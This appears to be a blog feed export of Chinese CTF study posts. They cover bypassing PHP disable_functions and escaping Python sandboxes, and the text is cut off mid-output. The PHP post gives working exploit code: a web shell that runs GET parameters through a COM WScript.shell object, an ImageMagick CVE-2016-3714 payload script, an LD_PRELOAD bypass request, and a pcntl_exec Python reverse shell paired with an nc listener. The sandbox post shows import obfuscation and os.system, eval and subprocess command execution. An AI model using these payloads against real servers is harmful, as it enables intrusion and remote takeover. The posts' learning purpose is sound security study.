参考链接：https://xz.aliyun.com/t/5535#toc-10https://mp.weixin.qq.com/s/RaxfIg9x5Rh1qjDgFBr82Qhttps://www.ctfwp.com/articals/2019national.html#justsosohttps://wx.zsxq.com/dweb/# ​]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[php bypass disable_functions(二)]]></title>
    <url>%2F2019%2F07%2F29%2Fphp%20bypass%20disable-functions-%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[continue COM组件官方说明： Now, why would or should you use COM? COM is one of the main ways to glue applications and components together on the Windows platform; using COM you can launch Microsoft Word, fill in a document template and save the result as a Word document and send it to a visitor of your web site. You can also use COM to perform administrative tasks for your network and to configure your IIS; these are just the most common uses; you can do much more with COM. 若开启，则可在phpinfo中的com_dotnet找到COM_support = enabled 利用代码： 12345678&lt;?php$command=$_GET['a'];$wsh = new COM('WScript.shell'); // 生成一个COM对象 Shell.Application也能$exec = $wsh-&gt;exec("cmd /c ".$command); //调用对象方法来执行命令$stdout = $exec-&gt;StdOut();$stroutput = $stdout-&gt;ReadAll();echo $stroutput;?&gt; ImageMagick官方说明： Imagick 是用 ImageMagic API 来创建和修改图像的PHP官方扩展。 ImageMagick® 是用来创建，编辑，合并位图图像的一套组件。 它能够用于读取，转换，写入多种不同格式的图像。 包含 DPX, EXR, GIF, JPEG, JPEG-2000, PDF, PhotoCD, PNG, Postscript, SVG, 和 TIFF。 利用版本：ImageMagick 6.9.3-9以前版本(CVE-2016-3714) 安装此扩展： sudo apt-get install php5.6-imagick安装后即可在phpinfo中找到imagick相关配置 利用代码： 123456789101112131415161718192021222324&lt;?phpecho "Disable Functions: " . ini_get('disable_functions') . "\n";$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];if ($command == '') &#123; $command = 'id';&#125;$exploit = &lt;&lt;&lt;EOFpush graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg"|$command")'pop graphic-contextEOF;file_put_contents("KKKK.mvg", $exploit);$thumb = new Imagick();$thumb-&gt;readImage('KKKK.mvg');$thumb-&gt;writeImage('KKKK.png');$thumb-&gt;clear();$thumb-&gt;destroy();unlink("KKKK.mvg");unlink("KKKK.png");?&gt; LD_PRELOADLD_PRELOAD是Linux下的一个环境变量，它允许你定义在程序运行前优先加载动态链接库 如果system()位于系统共享对象a.so中，想法在a.so前优先加载可控的evil.so，evil.so内含有与system()同名的恶意函数，由于evil.so优先级较高，所以进程会调用到evil.so的system()函数 该方法需要mail()和putenv()函数 根据大佬编好的poc(项目地址)，可以直接执行系统命令，例如 http://127.0.0.1/bypass_disablefunc.php?cmd=ls%20/&amp;outpath=/tmp/aa&amp;sopath=/var/www/html/bypass_disablefunc_x64.sopcntl_exec该方法需要pcntl_exec函数 首先本地监听： nc -lvvp 1234利用代码反弹shell: &lt;?php pcntl_exec(&quot;/usr/bin/python&quot;,array(&apos;-c&apos;, &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;xx.xx.xx.xx&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos;));?&gt; 参考：https://xz.aliyun.com/t/5320#toc-2https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[php bypass disable_functions(一)]]></title>
    <url>%2F2019%2F07%2F26%2Fphp%20bypass%20disable_functions%2F</url>
    <content type="text"><![CDATA[上次参加国赛线下赛碰到了这个知识点，当时题目给了个文件包含，并且给了个phpinfo页面，当时就立马想到了session包含，以为包含成功后可以执行系统命令了，但是却发现disable_functions下有一大堆函数!当时心态就炸了…由于当时没有截取phpinfo的页面，也不知道那道题考察的是什么知识点，，还是看大佬文章系统学习学习绕过disable_function的方式吧 ini_get()可以用此函数获得php的配置，如disable_functions： 12&lt;?phpecho ini_get('disable_functions'); 一些高危函数及其用法如下 shell_exec()反引号与shell_exec是等价的：通过shell环境执行命令，并将完整的输出以字符串的形式返回 1234&lt;?phpecho `ls`;echo shell_exec('ls'); exec()exec：执行一个外部程序；默认返回命令执行的最后一行内容 语法： exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) : string参数： command：要执行的命令。 output：如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 \n 字符。 请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 exec() 函数之前 对数组使用 unset() 函数进行重置。 return_var：如果同时提供 output 和 return_var 参数， 命令执行后的返回状态会被写入到此变量。 1234&lt;?phpexec('ls', $a);var_dump($a); passthru()passthru：执行外部程序并显示原始输出 123&lt;?phppassthru('ls'); system()system：执行外部程序，并显示输出 123&lt;?phpsystem('ls'); popen()popen：打开进程文件指针 语法： popen ( string $command , string $mode ) : resource打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 参数 ： command：命令。 mode：模式。 返回值：返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用 pclose() 来关闭。此指针可以用于 fgets()，fgetss() 和 fwrite()。 当模式为 ‘r’，返回的文件指针等于命令的 STDOUT，当模式为 ‘w’，返回的文件指针等于命令的 STDIN。如果出错返回 FALSE。 1234&lt;?php$a = popen('/bin/ls', 'r');echo fread($a, 2096); proc_open()proc_open：执行一个命令，并且打开用来输入/输出的文件指针 12345678910&lt;?php$proc=proc_open("ls", array( array("pipe","r"), array("pipe","w"), array("pipe","w") ), $pipes);print stream_get_contents($pipes[1]);?&gt; pcntl_exec()pcntl_exec：在当前进程空间执行指定程序 编译php的选项中默认是不开启pcntl的，详见这篇文章 mail()mail：发送邮件 详见：https://www.anquanke.com/post/id/86028https://skysec.top/2019/02/25/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8Bimap_open()%20RCE/ putenv()putenv ：设置环境变量的值 语法： putenv ( string $setting ) : bool添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。 在低于 5.2.6 版本的 PHP 中，可利用该函数修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令 dl()dl：运行时载入一个 PHP 扩展；php7中移除了此函数 windows下扩展文件后缀为.dll，linux下为.so 获取所有扩展： 12345&lt;?php print_r(get_loaded_extensions());?&gt; 检查一个扩展是否已经加载： 12345678&lt;?phpif (!extension_loaded('gd')) &#123; if (!dl('gd.so')) &#123; exit; &#125;&#125;?&gt; error_log()error_log：发送错误信息到某个地方]]></content>
  </entry>
  <entry>
    <title><![CDATA[python沙箱逃逸学习]]></title>
    <url>%2F2019%2F07%2F25%2Fpython%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[沙箱逃逸，就是在给我们一个代码执行的环境下，脱离种种过滤、限制，最终getshell的过程 0x01.命名空间命名空间是名称到对象的映射；按照变量定义的位置，有以下分类： Local，局部命名空间，每个函数所拥有的命名空间，记录了函数中定义的所有变量 Global，全局命名空间，每个模块加载执行时创建的，记录了模块中定义的变量 Built-in，内建命名空间，任何模块均可访问 上述三种命名空间的生命周期如下： Local，在函数调用时才被创建，当函数返回结果或抛出异常时被删除 Global，在模块加载时被创建，一直保留到python解释器退出 Built-in，在python解释器启动时创建，一直保留到python解释器退出 像len，print这些函数，我们并不需要引入模块而直接可以去调用，因此这些函数都来自内建命名空间 0x02.dir()函数dir()函数没有提供参数时，会返回当前范围内的变量、方法和定义的类型列表： Python 2.7.15+ (default, Nov 27 2018, 23:36:35) [GCC 7.3.0] on linux2 Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information. &gt;&gt;&gt; dir() [&apos;__builtins__&apos;, &apos;__doc__&apos;, &apos;__name__&apos;, &apos;__package__&apos;] &gt;&gt;&gt; a = 5 &gt;&gt;&gt; dir() [&apos;__builtins__&apos;, &apos;__doc__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;a&apos;]带参数时，会返回参数的属性、方法列表： &gt;&gt;&gt; dir([]) &gt;&gt;&gt; [&apos;__add__&apos;, &apos;__class__&apos;, &apos;__contains__&apos;, &apos;__delattr__&apos;, &apos;__delitem__&apos;, &apos;__delslice__&apos;, &apos;__doc__&apos;, &apos;__eq__&apos;, &apos;__format__&apos;, &apos;__ge__&apos;, &apos;__getattribute__&apos;, &apos;__getitem__&apos;, &apos;__getslice__&apos;, &apos;__gt__&apos;, &apos;__hash__&apos;, &apos;__iadd__&apos;, &apos;__imul__&apos;, &apos;__init__&apos;, &apos;__iter__&apos;, &apos;__le__&apos;, &apos;__len__&apos;, &apos;__lt__&apos;, &apos;__mul__&apos;, &apos;__ne__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__reversed__&apos;, &apos;__rmul__&apos;, &apos;__setattr__&apos;, &apos;__setitem__&apos;, &apos;__setslice__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;, &apos;append&apos;, &apos;count&apos;, &apos;extend&apos;, &apos;index&apos;, &apos;insert&apos;, &apos;pop&apos;, &apos;remove&apos;, &apos;reverse&apos;, &apos;sort&apos;]在没有提供参数时，可以看到__builtins__是作为默认模块出现的，可以查看该模块成分： &gt;&gt;&gt; dir(__builtins__) [&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;ZeroDivisionError&apos;, &apos;_&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;] &gt;&gt;&gt; 可以看到，里面有很多常用的函数，如__import__、input、open、eval、execfile等，还有很多异常、对象 因此，除了直接调用上述函数外，还可以用__builtins__.函数的方式调用，如： &gt;&gt;&gt; __builtins__.len(&apos;hello&apos;) 5如果把某函数从__builtins__中删除，那么就不能使用该函数了： &gt;&gt;&gt; del __builtins__.chr &gt;&gt;&gt; chr(1) Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; NameError: name &apos;chr&apos; is not defined但是，__builtins__模块下有个reload()函数(python2)，该函数可以重新载入之前载入的模块： &gt;&gt;&gt; reload(__builtins__) &lt;module &apos;__builtin__&apos; (built-in)&gt; &gt;&gt;&gt; chr(1) &apos;\x01&apos;如果把__builtins__模块下的reload删掉，那么就不能直接使用reload()函数了；但是，有个imp模块，它也提供了reload()方法。例如，python3.6下的__builtins__是没有reload的，可以用imp下的reload： &gt;&gt;&gt; import os &gt;&gt;&gt; import imp &gt;&gt;&gt; imp.reload(os) &lt;module &apos;os&apos; from &apos;/usr/lib/python3.6/os.py&apos;&gt;0x03.import、_import_()、importlib库importimport是一个关键字，通过下面这条命令可以看出： &gt;&gt;&gt; help(&apos;keywords&apos;) Here is a list of the Python keywords. Enter any keyword to get more help. and elif if print as else import raise assert except in return break exec is try class finally lambda while continue for not with def from or yield del global pass import可以用来导入一个包，在模块导入的时候，默认在当前目录下查找，然后再在系统中查找，系统查找的范围是sys.path下的所有路径： &gt;&gt;&gt; import sys &gt;&gt;&gt; sys.path [&apos;&apos;, &apos;/usr/lib/python2.7&apos;, &apos;/usr/lib/python2.7/plat-x86_64-linux-gnu&apos;, &apos;/usr/lib/python2.7/lib-tk&apos;, &apos;/usr/lib/python2.7/lib-old&apos;, &apos;/usr/lib/python2.7/lib-dynload&apos;, &apos;/home/gtfly/.local/lib/python2.7/site-packages&apos;, &apos;/usr/local/lib/python2.7/dist-packages&apos;, &apos;/usr/lib/python2.7/dist-packages&apos;, &apos;/usr/lib/python2.7/dist-packages/gtk-2.0&apos;]import的本质是： 搜索modules 绑定到局部变量 import module_name实质是将module_name.py中的全部代码加载到内存并赋值给与模块同名的变量写在当前文件中，这个变量的类型是module： &gt;&gt;&gt; import os &gt;&gt;&gt; type(os) &lt;type &apos;module&apos;&gt;sys.modules是一个全局字典，每导入新的模块，sys.modules将自动记录该模块，当第二次再导入该模块时，python会直接到该字典中去查找： &gt;&gt;&gt; sys.modules &gt;&gt;&gt; {&apos;copy_reg&apos;: &lt;module &apos;copy_reg&apos; from &apos;/usr/lib/python2.7/copy_reg.pyc&apos;&gt;, &apos;sre_compile&apos;: &lt;module &apos;sre_compile&apos; from &apos;/usr/lib/python2.7/sre_compile.pyc&apos;&gt;, &apos;_sre&apos;: &lt;module &apos;_sre&apos; (built-in)&gt;, &apos;encodings&apos;: &lt;module &apos;encodings&apos; from &apos;/usr/lib/python2.7/encodings/__init__.pyc&apos;&gt;, &apos;site&apos;: &lt;module &apos;site&apos; from &apos;/usr/lib/python2.7/site.pyc&apos;&gt;, &apos;__builtin__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;sysconfig&apos;: &lt;module &apos;sysconfig&apos; from &apos;/usr/lib/python2.7/sysconfig.pyc&apos;&gt;, &apos;__main__&apos;: &lt;module &apos;__main__&apos; (built-in)&gt;, &apos;encodings.encodings&apos;: None, &apos;abc&apos;: &lt;module &apos;abc&apos; from &apos;/usr/lib/python2.7/abc.pyc&apos;&gt;, &apos;posixpath&apos;: &lt;module &apos;posixpath&apos; from &apos;/usr/lib/python2.7/posixpath.pyc&apos;&gt;, &apos;_weakrefset&apos;: &lt;module &apos;_weakrefset&apos; from &apos;/usr/lib/python2.7/_weakrefset.pyc&apos;&gt;, &apos;errno&apos;: &lt;module &apos;errno&apos; (built-in)&gt;, &apos;encodings.codecs&apos;: None, &apos;sre_constants&apos;: &lt;module &apos;sre_constants&apos; from &apos;/usr/lib/python2.7/sre_constants.pyc&apos;&gt;, &apos;re&apos;: &lt;module &apos;re&apos; from &apos;/usr/lib/python2.7/re.pyc&apos;&gt;, &apos;_abcoll&apos;: &lt;module &apos;_abcoll&apos; from &apos;/usr/lib/python2.7/_abcoll.pyc&apos;&gt;, &apos;types&apos;: &lt;module &apos;types&apos; from &apos;/usr/lib/python2.7/types.pyc&apos;&gt;, &apos;_codecs&apos;: &lt;module &apos;_codecs&apos; (built-in)&gt;, &apos;encodings.__builtin__&apos;: None, &apos;_warnings&apos;: &lt;module &apos;_warnings&apos; (built-in)&gt;, &apos;genericpath&apos;: &lt;module &apos;genericpath&apos; from &apos;/usr/lib/python2.7/genericpath.pyc&apos;&gt;, &apos;stat&apos;: &lt;module &apos;stat&apos; from &apos;/usr/lib/python2.7/stat.pyc&apos;&gt;, &apos;zipimport&apos;: &lt;module &apos;zipimport&apos; (built-in)&gt;, &apos;_sysconfigdata&apos;: &lt;module &apos;_sysconfigdata&apos; from &apos;/usr/lib/python2.7/_sysconfigdata.pyc&apos;&gt;, &apos;warnings&apos;: &lt;module &apos;warnings&apos; from &apos;/usr/lib/python2.7/warnings.pyc&apos;&gt;, &apos;UserDict&apos;: &lt;module &apos;UserDict&apos; from &apos;/usr/lib/python2.7/UserDict.pyc&apos;&gt;, &apos;encodings.utf_8&apos;: &lt;module &apos;encodings.utf_8&apos; from &apos;/usr/lib/python2.7/encodings/utf_8.pyc&apos;&gt;, &apos;sys&apos;: &lt;module &apos;sys&apos; (built-in)&gt;, &apos;codecs&apos;: &lt;module &apos;codecs&apos; from &apos;/usr/lib/python2.7/codecs.pyc&apos;&gt;, &apos;readline&apos;: &lt;module &apos;readline&apos; from &apos;/usr/lib/python2.7/lib-dynload/readline.x86_64-linux-gnu.so&apos;&gt;, &apos;_sysconfigdata_nd&apos;: &lt;module &apos;_sysconfigdata_nd&apos; from &apos;/usr/lib/python2.7/plat-x86_64-linux-gnu/_sysconfigdata_nd.pyc&apos;&gt;, &apos;os.path&apos;: &lt;module &apos;posixpath&apos; from &apos;/usr/lib/python2.7/posixpath.pyc&apos;&gt;, &apos;_locale&apos;: &lt;module &apos;_locale&apos; (built-in)&gt;, &apos;sitecustomize&apos;: &lt;module &apos;sitecustomize&apos; from &apos;/usr/lib/python2.7/sitecustomize.pyc&apos;&gt;, &apos;signal&apos;: &lt;module &apos;signal&apos; (built-in)&gt;, &apos;traceback&apos;: &lt;module &apos;traceback&apos; from &apos;/usr/lib/python2.7/traceback.pyc&apos;&gt;, &apos;linecache&apos;: &lt;module &apos;linecache&apos; from &apos;/usr/lib/python2.7/linecache.pyc&apos;&gt;, &apos;posix&apos;: &lt;module &apos;posix&apos; (built-in)&gt;, &apos;encodings.aliases&apos;: &lt;module &apos;encodings.aliases&apos; from &apos;/usr/lib/python2.7/encodings/aliases.pyc&apos;&gt;, &apos;exceptions&apos;: &lt;module &apos;exceptions&apos; (built-in)&gt;, &apos;sre_parse&apos;: &lt;module &apos;sre_parse&apos; from &apos;/usr/lib/python2.7/sre_parse.pyc&apos;&gt;, &apos;os&apos;: &lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;, &apos;_weakref&apos;: &lt;module &apos;_weakref&apos; (built-in)&gt;}现在设置一下modules中os的值为None： &gt;&gt;&gt; sys.modules[&apos;os&apos;] = None &gt;&gt;&gt; import os &gt;&gt;&gt; Traceback (most recent call last): &gt;&gt;&gt; File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; &gt;&gt;&gt; ImportError: No module named os发现把os从modules中删去就不能直接引入了；但是，我们可以接着设置os的模块的路径，从而引入该模块： &gt;&gt;&gt; sys.modules[&apos;os&apos;] = &apos;/usr/lib/python2.7/os.py&apos; &gt;&gt;&gt; import os &gt;&gt;&gt; 如果sys模块也不能用，那么就不能通过设置路径来重新引入模块了，但可以使用python的内建函数： execfile：execfile() 函数可以用来执行一个文件(python2) exec：执行存储在字符串或文件中的python语句；python2的exec是一个内置语句而不是函数；python3将python2中的exec和execfile()功能整合到一个exec()函数中了 例如(python2)： &gt;&gt;&gt; execfile(&apos;/usr/lib/python2.7/os.py&apos;) &gt;&gt;&gt; system(&apos;ls /&apos;)或者： &gt;&gt;&gt; exec open(&apos;/usr/lib/python2.7/os.py&apos;) &gt;&gt;&gt; system(&apos;ls /&apos;)_import_()__import__与import是有区别的，__import__()是一个函数，而不是关键字； __import__只做了一件事：搜索modules；import执行过程是调用__import__来完成模块检索的 __import__作为一个函数，只能接受字符串参数，返回值可以直接用来操作；通常在动态加载的时候用到这个函数： &gt;&gt;&gt; __import__(&apos;re&apos;).findall(&apos;(hi)&apos;, &apos;hilinghi&apos;) [&apos;hi&apos;, &apos;hi&apos;] &gt;&gt;&gt; 因此，如果沙箱对导入的包名称做了限制，我们可以在导入模块前先对模块名称做处理，如： &gt;&gt;&gt; &apos;os&apos;.encode(&apos;base64&apos;) &apos;b3M=\n&apos; &gt;&gt;&gt; a = __import__(&apos;b3M=\n&apos;.decode(&apos;base64&apos;)) &gt;&gt;&gt; a.chdir(&apos;../&apos;) &gt;&gt;&gt; a.getcwd() &apos;/home&apos;importlibimportlib模块是对import和__import__()的补充；它也可以通过传入字符串来引入一个模块 &gt;&gt;&gt; import importlib &gt;&gt;&gt; a = importlib.import_module(&apos;os&apos;) &gt;&gt;&gt; a.chdir(&apos;../&apos;) &gt;&gt;&gt; 0x04.python中的高危函数、方法eval()eval()函数用来执行一个字符串表达式，并返回表达式的值；如果表达式中的值是我们可控的话，那么可以做很多事，如： 获取文件内容： &gt;&gt;&gt; eval(&quot;open(&apos;/var/www/html/index.php&apos;).read()&quot;) &quot;&lt;?php\n\necho $_GET[&apos;a&apos;];\n&quot; &gt;&gt;&gt; 引入模块： &gt;&gt;&gt; eval(&quot;__import__(&apos;os&apos;).system(&apos;ls /&apos;)&quot;) bin dev initrd.img lib64 mnt root snap tmp 这里要注意，eval()的参数类型除了是字符串外，还可以是其他类型；先来了解一下compile()函数的用法： compile()函数可以将一个字符串编译为字节代码，语法为： compile(source, filename, mode[, flags[, dont_inherit]])参数 source – 字符串或者AST（Abstract Syntax Trees）对象。。 filename – 代码文件名称，如果不是从文件读取代码则传递一些可辨认的值。 mode – 指定编译代码的种类。可以指定为 exec, eval, single。 flags – 变量作用域，局部命名空间，如果被提供，可以是任何映射对象。。 flags和dont_inherit是用来控制编译源码时的标志 例如： &gt;&gt;&gt; a = compile(&quot;open(&apos;/var/www/html/index.php&apos;).read()&quot;, &apos;&apos;, &apos;eval&apos;) &gt;&gt;&gt; type(a) &lt;type &apos;code&apos;&gt; &gt;&gt;&gt; eval(a) &quot;&lt;?php\n\necho $_GET[&apos;a&apos;];\n&quot; &gt;&gt;&gt; 另外，exec、execfile这些类似的高危函数上述已提及，这里不再赘述 os模块os.system()执行命令成功后会返回０ &gt;&gt;&gt; a = os.system(&apos;ls /&apos;) bin dev initrd.img lib64 mnt root snap tmp &gt;&gt;&gt; print a 0而os.popen()该方法是以文件对象的形式返回shell指令运行的结果，获取结果可以调用read()或readlines()方法： &gt;&gt;&gt; a = os.popen(&apos;ls /&apos;) &gt;&gt;&gt; print a &lt;open file &apos;ls /&apos;, mode &apos;r&apos; at 0x7f6c232865d0&gt; &gt;&gt;&gt; print a.read() bin boot cdrom dev etc home此外，site模块也有os方法，如果不能直接引入os，可以通过引入site，通过site.os调用： &gt;&gt;&gt; import site &gt;&gt;&gt; site.os.system(&apos;ls /&apos;) bin dev initrd.img lib64 mnt root snap tmp 0 &gt;&gt;&gt; commands模块commands.getstatusoutput：以元组的形式返回结果，第一个元素为状态码，第二个元素为执行结果： &gt;&gt;&gt; import commands &gt;&gt;&gt; commands.getstatusoutput(&apos;ls /&apos;) (0, &apos;bin\nboot\ncdrom\ndev\netc\nhome&apos;)commands.getoutput：直接以字符串的形式返回命令执行的结果： &gt;&gt;&gt; commands.getoutput(&apos;ls /&apos;) &apos;bin\nboot\ncdrom\ndev\netc\nhome\&apos;subprocess模块可以用这个模块创建子进程 subprocess模块定义了一个Popen类，通过它可以创建进程，并与其进行复杂的交互。 __init__(self, args, bufsize=0, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=False, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0)关键的参数： args：一般是一个字符串，是要执行的shell命令内容 shell：默认为False；为True时，表示将通过shell来执行 Popen对象创建后，主程序不会自动等待子进程，因此我们可以调用wait()方法，使父进程等待子进程： &gt;&gt;&gt; subprocess.Popen(&apos;ls /&apos;, shell=True).wait() bin dev initrd.img lib64 mnt root 0 &gt;&gt;&gt; 下面的这些函数都是基于Popen()的封装，都可以执行shell命令，与Popen()用法很类似： &gt;&gt;&gt; subprocess.call(&apos;ls /&apos;, shell=True) &gt;&gt;&gt; subprocess.check_call(&apos;ls /&apos;, shell=True) # Python2.5新增 &gt;&gt;&gt; subprocess.check_output(&apos;ls /&apos;, shell=True) # Python2.7新增 &gt;&gt;&gt; subprocess.run(&apos;ls /&apos;, shell=True) # Python3.5新增详细说明可参考：https://www.cnblogs.com/lincappu/p/8270709.html timeit&gt;&gt;&gt; import timeit &gt;&gt;&gt; timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;, number=1)platform&gt;&gt;&gt; import platform &gt;&gt;&gt; platform.popen(&apos;ls /&apos;).read()0x05.常用的内建属性python中一切皆为对象；python的所有类默认继承object类，object类提供了很多原始的内建属性和方法，因此用户自定义的类在python中也会继承这些内建属性；学习了下面这些内建属性，那么在沙箱中就可以很容易的构造出poc _class___class__同type()，都可查看对象所在的类： &gt;&gt;&gt; class Student(): ... def __init__(self, name): ... self.name = name ... &gt;&gt;&gt; stu = Student(&apos;ling&apos;) &gt;&gt;&gt; type(stu) &lt;class &apos;__main__.Student&apos;&gt; &gt;&gt;&gt; stu.__class__ &lt;class &apos;__main__.Student&apos;&gt; &gt;&gt;&gt; _base_可以获取类的一个基类，一般情况下是object，有时不是，例如继承类的时候： &gt;&gt;&gt; class Student(): ... def __init__(self, name): ... self.name = name ... &gt;&gt;&gt; stu = Student(&apos;ling&apos;) &gt;&gt;&gt; stu.__class__.__base__ &lt;class &apos;object&apos;&gt; &gt;&gt;&gt; class Student2(Student): ... pass ... &gt;&gt;&gt; stu2 = Student2() &gt;&gt;&gt; stu2.__class__.__base__ &lt;class &apos;__main__.Student&apos;&gt;_mro_以元祖的形式返回整个继承链的关系： &gt;&gt;&gt; stu2.__class__.__mro__ (&lt;class &apos;__main__.Student2&apos;&gt;, &lt;class &apos;__main__.Student&apos;&gt;, &lt;class &apos;object&apos;&gt;)上面显示了Student2继承自Student，Student继承自object；因此可以直接获取object类： &gt;&gt;&gt; stu2.__class__.__mro__[-1] &gt;&gt;&gt; &lt;class &apos;object&apos;&gt;_subclasses_()上述两种方法可以得到object类，但如果代码中没有Student类，我们可以用利用python自带的对象(一切皆为对象)： &gt;&gt;&gt; [].__class__.__base__ &lt;class &apos;object&apos;&gt; &gt;&gt;&gt; &apos;&apos;.__class__.__base__ &lt;class &apos;object&apos;&gt; &gt;&gt;&gt; ().__class__.__base__ &lt;class &apos;object&apos;&gt; &gt;&gt;&gt; {}.__class__.__base__ &lt;class &apos;object&apos;&gt;得到object类后，就可以用__subclasses__()方法获得所有继承此类的子类： &gt;&gt;&gt; [].__class__.__base__.__subclasses__() [&lt;class &apos;type&apos;&gt;, &lt;class &apos;weakref&apos;&gt;, &lt;class &apos;weakcallableproxy&apos;&gt;, &lt;class &apos;weakproxy&apos;&gt;, &lt;class &apos;int&apos;&gt;, &lt;class &apos;bytearray&apos;&gt;, &lt;class &apos;bytes&apos;&gt;, &lt;class &apos;list&apos;&gt;, &lt;class &apos;NoneType&apos;&gt;, &lt;class &apos;NotImplementedType&apos;&gt;, &lt;class &apos;traceback&apos;&gt;, &lt;class &apos;super&apos;&gt;, &lt;class &apos;range&apos;&gt;, &lt;class &apos;dict&apos;&gt;, &lt;class &apos;dict_keys&apos;&gt;, &lt;class &apos;dict_values&apos;&gt;, &lt;class &apos;dict_items&apos;&gt;, &lt;class &apos;odict_iterator&apos;&gt;, &lt;class &apos;set&apos;&gt;, &lt;class &apos;str&apos;&gt;, &lt;class &apos;slice&apos;&gt;, &lt;class &apos;staticmethod&apos;&gt;, &lt;class &apos;complex&apos;&gt;, &lt;class &apos;float&apos;&gt;, &lt;class &apos;frozenset&apos;&gt;, &lt;class &apos;property&apos;&gt;, &lt;class &apos;managedbuffer&apos;&gt;, &lt;class &apos;memoryview&apos;&gt;, &lt;class 